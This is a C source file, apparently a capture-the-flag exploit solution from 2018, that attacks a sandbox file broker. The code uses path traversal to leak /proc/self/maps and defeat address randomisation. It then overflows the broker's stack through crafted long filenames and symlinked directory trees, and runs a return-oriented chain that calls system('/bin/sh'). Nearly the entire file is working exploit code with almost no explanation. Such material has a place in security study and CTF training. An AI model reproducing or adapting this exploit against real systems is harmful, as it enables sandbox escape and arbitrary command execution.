/*
Copyright 2018 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <signal.h>
#include <ftw.h>
#include <sys/mount.h>
#include <sched.h>
#include <sched.h>
#include <err.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <linux/memfd.h>
#include <fcntl.h>
#include <stdint.h>
#include <signal.h>
#include <regex.h>
#include <linux/random.h>

#include "client_lib.h"
#include "util.h"

#define LONG_DIR "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define LINK_DIR "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"

int hax_read(const char *filename) {
  size_t sz = (1l<<31);
  char *hax = (char*) malloc(sz);
  if (!hax) {
    err(1, "malloc(huge)");
  }
  puts("malloc(huge) done");
  int filename_start = PATH_MAX - strlen(filename) - strlen("/tmp/shared/") - 1;
  strcpy(&hax[filename_start], filename);
  memcpy(&hax[filename_start-6], "/../..", 6);
  memset(hax, '/', filename_start-6);
  int a_start = filename_start + strlen(filename);
  memset(hax+a_start, 'A', sz-1-a_start);
  hax[sz-1] = 0;
  send_pid(BROKER_FD);
  send_ull(BROKER_FD, GET_FILE);
  send_str(BROKER_FD, hax);
  send_str(BROKER_FD, "foobar");
  char *resp = read_str(BROKER_FD);
  if (strcmp(resp, "OK") != 0) {
    err(1, "resp not OK");
  }
  free(resp);
  open("foobar", O_RDONLY);
}

void overflow(char *filename, char *outname) {
  send_pid(BROKER_FD);
  send_ull(BROKER_FD, GET_FILE);
  send_str(BROKER_FD, filename);
  send_str(BROKER_FD, outname);
  char *resp = read_str(BROKER_FD);
  if (strcmp(resp, "OK") != 0) {
    err(1, "resp not OK");
  }
  free(resp);
}

void get_libc_stack(unsigned long long *libc, unsigned long long *stack) {
  int fd = hax_read("/proc/self/maps");
  char read_buf[8*4096];
  ssize_t cnt = read(fd, read_buf, sizeof(read_buf));
  if (cnt < 0) {
    err(1, "read");
  }
  printf("read maps: '''%s'''\n", read_buf);
  char * libc_off = strstr(read_buf, "/libc");
  while (*libc_off != '\n') {
    libc_off--;
  }
  if (sscanf(libc_off, "%llx ", libc) != 1) {
    err(1, "scanf");
  }
  char *stack_off = read_buf;
  for (char *stack_off = read_buf; *stack_off; stack_off = strchr(stack_off, '\n')+1) {
    unsigned long long start, end;
    if (sscanf(stack_off, "%llx-%llx", &start, &end) != 2) {
      err(1, "scanf");
    }
    if (end-start == 0x9000) {
      *stack = start;
      return;
    }
  }
  die("stack mapping not found");
}

void put_on_stack(int off, unsigned long long val) {
  char filename[PATH_MAX] = {0};
  // /tmp/shared/
  memset(filename, 'A', off + 4 + 7);
  write_shared_file(filename, "bar", 3);
  filename[off+4] = 0;
  strcat(filename, (char*) &val);
  write_shared_file(filename, "bar", 3);
}

void write_to(int off, unsigned long long val) {
  printf("writing 0x%llx at off %d\n", val, off);

  check(mkdir("/newroot", 0700), "mkdir");
  check(mount("", "/newroot", "tmpfs", 0, NULL), "mount");
  check(syscall(SYS_pivot_root, "/newroot", "/newroot"), "pivot_root");
  check(umount2("/", MNT_DETACH), "umount(/)");
  check(chdir("/"), "chdir");

  for (int i = 0; i < 128; i++) {
    check(mkdir(LINK_DIR, 0700), "mkdir");
    check(chdir(LINK_DIR), "chdir");
  }
  check(chdir("/"), "chdir");

  char filename[4096] = "";
  for (int i = 0; i < 15; i++) {
    strcat(filename, LINK_DIR "/");
  }
  strcat(filename, "x");
  overflow("foo", filename);

  for (int i = 0; i < 15; i++) {
    check(chdir(LINK_DIR), "chdir");
  }

  check(unlink("x"), "unlink");
  check(symlink("/", "x"), "symlink");

  strcat(filename, "y");

  check(chdir("/"), "chdir");

  for (int i = 0; i < 128; i++) {
    check(mkdir(LONG_DIR, 0700), "mkdir");
    check(chdir(LONG_DIR), "chdir");
  }

  for (int i = 0; i < off; i++) {
    strcat(filename, "B");
  }

  strcat(filename, (char*)&val);
  overflow("foo", filename);
}

void write_ugidmap(const char * const path, int ugid) {
  int fd = check(open(path, O_WRONLY), "open(ugidmap)");
  char buf[1024] = "";
  snprintf(buf, sizeof(buf), "%d %d 1", ugid, ugid);
  size_t len = strlen(buf)+1;
  if (write(fd, buf, len) != len) {
    err(1, "write(ugidmap)");
  }
  check(close(fd), "close(ugidmap)");
}

void setgroups() {
  int fd = check(open("/proc/self/setgroups", O_WRONLY), "open(setgroups)");
  if (write(fd, "deny", 5) != 5) {
    err(1, "write(setgroups)");
  }
  check(close(fd), "close(setgroups)");
}

int main(int argc, char **argv) {
  int uid = getuid();
  int gid = getgid();
  puts("unsharing");
  check(unshare(CLONE_NEWUSER | CLONE_NEWNS), "unshare");
  setgroups();
  write_ugidmap("/proc/self/uid_map", uid);
  write_ugidmap("/proc/self/gid_map", gid);
  unsigned long leave_ret = 0x42351;
  unsigned long long rop[] = {
    0x21102, // pop rdi
    0x18cd57, // "/bin/sh"
    0x45390, // system
  };
  unsigned long long libc;
  unsigned long long stack;

  puts("initialized, leaking addresses");

  get_libc_stack(&libc, &stack);

  printf("libc at 0x%llx\n", libc);
  printf("stack at 0x%llx\n", stack);

  write_shared_file("foo", "bar", 3);

  write_to(0x115, libc + leave_ret); // leave; ret
  write_to(0x115-(8*5)+6, 0x43);

  int rop_len = sizeof(rop)/sizeof(*rop);
  unsigned long long rop_start = stack+0x9000-(8*6)-(8*rop_len);
  write_to(0x115-(8*5), rop_start-8);

  for (int i = 0; i < rop_len; i++) {
    int off = 0x115-(8*6)-(8*i);
    write_to(off+6, 0x43);
    write_to(off, libc+rop[rop_len-1-i]);
  }

  puts("done");

  send_pid(BROKER_FD);
  send_ull(BROKER_FD, EXIT);

  raise(SIGSTOP);

  return 0;
}
